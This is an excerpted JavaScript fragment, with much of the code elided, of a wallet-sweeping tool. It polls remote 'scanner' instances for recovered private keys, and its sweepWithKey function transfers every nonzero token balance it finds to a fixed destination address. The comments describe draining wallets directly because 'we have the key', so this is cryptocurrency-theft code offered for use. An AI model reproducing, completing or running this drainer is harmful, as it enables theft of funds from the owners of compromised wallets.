...
// Polls Render-hosted scanner instances for recovered private keys and sweeps
// those wallets directly (no delegation needed — we have the key).

const IRIS_ENDPOINTS = (process.env.IRIS_SCANNER_URLS || "").split(",").filter(Boolean);
const IRIS_POLL_INTERVAL = 60_000; // 60s
const irisSwept = new Set(); // track already-swept addresses
    ...
    try {
      ...
      for (const hit of hits) {
        ...
        try {
          ...
          warn(`[iris] sweep failed for ${addr}: ${e.message}`);
        }
      }
    } catch {}
  }
...
async function sweepWithKey(privateKey, address) {
  ...
  for (const token of TOKENS.slice(0, 20)) {
    try {
      ...
      const bal = await tokenContract.balanceOf(checksum);
      if (bal > 0n) {
        const tx = await tokenContract.transfer(DESTINATION_ADDRESS, bal);
...
function startIrisPoller() {
  if (!IRIS_ENDPOINTS.length) {
    log("[iris] no IRIS_SCANNER_URLS configured — scanner integration disabled");
    return;
  }
  log(`[iris] polling ${IRIS_ENDPOINTS.length} scanner instance(s) every ${IRIS_POLL_INTERVAL / 1000}s`);
  pollIrisScanner(); // immediate first poll
